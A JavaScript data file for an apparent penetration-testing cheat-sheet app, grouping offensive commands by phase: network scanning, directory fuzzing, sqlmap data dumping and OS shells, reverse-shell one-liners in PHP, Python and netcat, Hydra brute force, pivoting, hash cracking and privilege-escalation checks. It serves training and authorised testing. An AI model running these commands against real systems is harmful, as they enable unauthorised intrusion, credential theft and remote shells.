import React from 'react';
import {
  Network,
  Zap,
  Server,
  Search,
  Code,
  DatabaseZap,
  Terminal as MSFIcon,
  Wand2,
  TerminalSquare,
  Box,
  Unlock,
  Layers,
  Hash,
  Shield
} from 'lucide-react';

export const ROADMAP_DATA = [
  {
    id: 'recon',
    title: 'Network Recon',
    icon: <Network className="w-5 h-5" />,
    description: 'Initial host discovery and network topology mapping.',
    accent: 'from-blue-500/20 to-transparent',
    snippets: [
      { label: 'Fping Range', cmd: 'fping -asg 10.10.10.0/24', info: 'Fast sweep to find live hosts via ICMP.' },
      { label: 'Nmap Discovery', cmd: 'nmap -sn 10.10.10.0/24', info: 'Standard ping sweep. Useful to map scope.' },
      { label: 'Netdiscover', cmd: 'netdiscover -r 10.10.10.0/24', info: 'ARP based discovery. Best for local switched networks.' }
    ]
  },
  {
    id: 'nmap_pro',
    title: 'Nmap Deep Dive',
    icon: <Zap className="w-5 h-5" />,
    description: 'Advanced scanning for services, OS, and vulnerabilities.',
    accent: 'from-orange-500/20 to-transparent',
    snippets: [
      { label: 'Service & OS', cmd: 'nmap -sV -O -p- --open 10.10.10.10', info: 'Intense scan focusing on versions and OS detection for open ports.' },
      { label: 'Vuln Scan', cmd: 'nmap --script vuln -p80,445 10.10.10.10', info: 'Runs Nmap Vulnerability Engine scripts against target services.' },
      { label: 'Aggressive Scan', cmd: 'nmap -A -T4 10.10.10.10', info: 'Combines OS detection, version detection, script scanning, and traceroute.' },
      { label: 'Evasion Scan', cmd: 'nmap -f -D RND:10 10.10.10.10', info: 'Fragments packets and uses 10 random decoys to evade simple IDS.' }
    ]
  },
  {
    id: 'infra',
    title: 'Infrastructure & DNS',
    icon: <Server className="w-5 h-5" />,
    description: 'Enumerating critical protocols like DNS, SNMP, and NFS.',
    accent: 'from-indigo-500/20 to-transparent',
    snippets: [
      { label: 'DNS Zone Transfer', cmd: 'dig axfr @10.10.10.10 domain.local', info: 'Try to dump the entire DNS zone file from a misconfigured server.' },
      { label: 'SNMP Enumeration', cmd: 'snmpwalk -v2c -c public 10.10.10.10', info: 'Query system information if the community string is known.' },
      { label: 'NFS Export List', cmd: 'showmount -e 10.10.10.10', info: 'Identify shared directories available for mounting.' }
    ]
  },
  {
    id: 'fuzzing',
    title: 'Directory Fuzzing',
    icon: <Search className="w-5 h-5" />,
    description: 'Brute-forcing hidden paths using various engines.',
    accent: 'from-orange-500/20 to-transparent',
    snippets: [
      { label: 'FFUF (Modern)', cmd: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.txt', info: 'High-speed fuzzer. Recommended for large lists and extensions.' },
      { label: 'Gobuster Dir', cmd: 'gobuster dir -u http://target.com -w wordlist.txt -t 50', info: 'Reliable and stable. Good for directory/file discovery.' },
      { label: 'Dirb (Legacy)', cmd: 'dirb http://target.com /usr/share/wordlists/dirb/common.txt', info: 'Classic tool. Slow but performs recursive scanning by default.' }
    ]
  },
  {
    id: 'cms',
    title: 'CMS & API Exploits',
    icon: <Code className="w-5 h-5" />,
    description: 'Attacking WordPress, Joomla, and REST APIs.',
    accent: 'from-emerald-500/20 to-transparent',
    snippets: [
      { label: 'WPScan API Brute', cmd: 'wpscan --url http://site.com --password-attack wp-login -u admin -P list.txt', info: 'Perform brute force specifically against the WordPress login.' },
      { label: 'WP User Enum (JSON)', cmd: 'curl http://site.com/wp-json/wp/v2/users', info: 'Abuse the REST API to list valid usernames without authentication.' },
      { label: 'JoomScan', cmd: 'joomscan -u http://target.com', info: 'Analyze Joomla versions and known vulnerable components.' }
    ]
  },
  {
    id: 'sqlmap_pro',
    title: 'SQLMap Deep Dive',
    icon: <DatabaseZap className="w-5 h-5" />,
    description: 'Advanced automated SQL injection and exploitation.',
    accent: 'from-cyan-500/20 to-transparent',
    snippets: [
      { label: 'POST Request Scan', cmd: 'sqlmap -r request.txt --batch --dbs', info: 'Scan a captured HTTP request file. Most effective for POST forms.' },
      { label: 'Dump Table Data', cmd: 'sqlmap -u "URL" -D db_name -T users --dump', info: 'Target a specific database and table to extract all sensitive rows.' },
      { label: 'OS Shell Access', cmd: 'sqlmap -u "URL" --os-shell', info: 'Attempts to gain a remote interactive shell via SQL injection.' },
      { label: 'Bypass WAF', cmd: 'sqlmap -u "URL" --tamper=space2comment,between', info: 'Uses tamper scripts to bypass simple filters or Firewalls.' }
    ]
  },
  {
    id: 'msf_pro',
    title: 'Metasploit Framework',
    icon: <MSFIcon className="w-5 h-5" />,
    description: 'The standard framework for professional exploitation.',
    accent: 'from-blue-600/20 to-transparent',
    snippets: [
      { label: 'DB Management', cmd: 'systemctl start postgresql; msfdb init', info: 'Initialize the database to use search and workspace features.' },
      { label: 'Search & Info', cmd: 'search name:eternalblue type:exploit; info 0', info: 'Quickly find and inspect module requirements.' },
      { label: 'Session Handling', cmd: 'sessions -i 1; background', info: 'Interact with active sessions or send them to the background.' },
      { label: 'Post Modules', cmd: 'use post/windows/gather/win_privs', info: 'Run automated local enumeration scripts.' }
    ]
  },
  {
    id: 'shells',
    title: 'Reverse Shell Alchemy',
    icon: <Wand2 className="w-5 h-5" />,
    description: 'Generating reliable shells for different environments.',
    accent: 'from-red-500/20 to-transparent',
    snippets: [
      { label: 'PHP Reverse', cmd: "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", info: 'Standard PHP one-liner for command execution.' },
      { label: 'Python Reverse', cmd: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", info: 'Python shell that spawns a PTY automatically.' },
      { label: 'Netcat Traditional', cmd: 'nc IP PORT -e /bin/bash', info: 'The classic Netcat reverse shell.' }
    ]
  },
  {
    id: 'tty',
    title: 'TTY Stabilization',
    icon: <TerminalSquare className="w-5 h-5" />,
    description: 'Upgrading limited shells to full interactive terminals.',
    accent: 'from-zinc-500/20 to-transparent',
    snippets: [
      { label: 'Python PTY', cmd: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', info: 'First step: Spawns a proper bash process.' },
      { label: 'Shell Background', cmd: 'CTRL+Z -> stty raw -echo; fg', info: 'Step 2: TAB completion and signal handling.' },
      { label: 'Terminal Reset', cmd: 'reset; export TERM=xterm', info: 'Step 3: Cleans the UI and sets environment.' }
    ]
  },
  {
    id: 'smb',
    title: 'SMB & Windows Deep Dive',
    icon: <Box className="w-5 h-5" />,
    description: 'Accessing shares, listing users, and checking versions.',
    accent: 'from-purple-500/20 to-transparent',
    snippets: [
      { label: 'SMBMap Shares', cmd: 'smbmap -H 10.10.10.10', info: 'List share permissions for a host.' },
      { label: 'RPC Null Session', cmd: 'rpcclient -U "" -N 10.10.10.10', info: 'Connect with no credentials to query user info.' },
      { label: 'CrackMap SMB', cmd: 'crackmapexec smb 10.10.10.10 -u "guest" -p "" --shares', info: 'Credential testing and mass enumeration.' }
    ]
  },
  {
    id: 'auth',
    title: 'Auth Attacks (Hydra)',
    icon: <Unlock className="w-5 h-5" />,
    description: 'Online brute force for various services.',
    accent: 'from-red-500/20 to-transparent',
    snippets: [
      { label: 'Hydra SSH', cmd: 'hydra -L users.txt -P pass.txt 10.10.10.10 ssh', info: 'Standard SSH brute force.' },
      { label: 'Hydra FTP', cmd: 'hydra -L users.txt -P pass.txt 10.10.10.10 ftp', info: 'Brute force FTP accounts.' },
      { label: 'Hydra RDP', cmd: 'hydra -L users.txt -P pass.txt rdp://10.10.10.10', info: 'Check for weak RDP credentials.' },
      { label: 'Hydra Form (POST)', cmd: 'hydra -l admin -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"', info: 'Custom web login brute force.' }
    ]
  },
  {
    id: 'pivoting',
    title: 'Network Pivoting',
    icon: <Layers className="w-5 h-5" />,
    description: 'Bypassing segment boundaries via compromised nodes.',
    accent: 'from-yellow-500/20 to-transparent',
    snippets: [
      { label: 'MSF Autoroute', cmd: 'run autoroute -s 10.10.20.0/24', info: 'Route traffic through a Meterpreter session.' },
      { label: 'Port Forward', cmd: 'portfwd add -l 8080 -p 80 -r 10.10.20.5', info: 'Bind a remote port to your local machine.' },
      { label: 'SOCKS Proxy', cmd: 'use auxiliary/server/socks_proxy', info: 'Expose internal networks to external tools.' }
    ]
  },
  {
    id: 'cracking',
    title: 'Offline Cracking',
    icon: <Hash className="w-5 h-5" />,
    description: 'Decrypting hashes with John and Hashcat.',
    accent: 'from-pink-500/20 to-transparent',
    snippets: [
      { label: 'Hashcat NTLM', cmd: 'hashcat -m 1000 hashes.txt rockyou.txt', info: 'Windows hashes (SAM/NTDS).' },
      { label: 'John Linux Hash', cmd: 'john --wordlist=rockyou.txt shadow_hashes', info: '/etc/shadow or custom crypts.' },
      { label: 'Hashcat MD5', cmd: 'hashcat -m 0 hash.txt rockyou.txt', info: 'Classic MD5 database hash cracking.' }
    ]
  },
  {
    id: 'post',
    title: 'PrivEsc & Post-Ex',
    icon: <Shield className="w-5 h-5" />,
    description: 'Gaining higher privileges and sensitive info.',
    accent: 'from-emerald-500/20 to-transparent',
    snippets: [
      { label: 'Sudo Privs', cmd: 'sudo -l', info: 'Check for commands that run with elevated privileges.' },
      { label: 'SUID Search', cmd: 'find / -perm -u=s -type f 2>/dev/null', info: 'Search for binaries that execute as root.' },
      { label: 'Shadow Read', cmd: 'ls -l /etc/shadow', info: 'Verify if sensitive hashes are readable.' }
    ]
  }
];
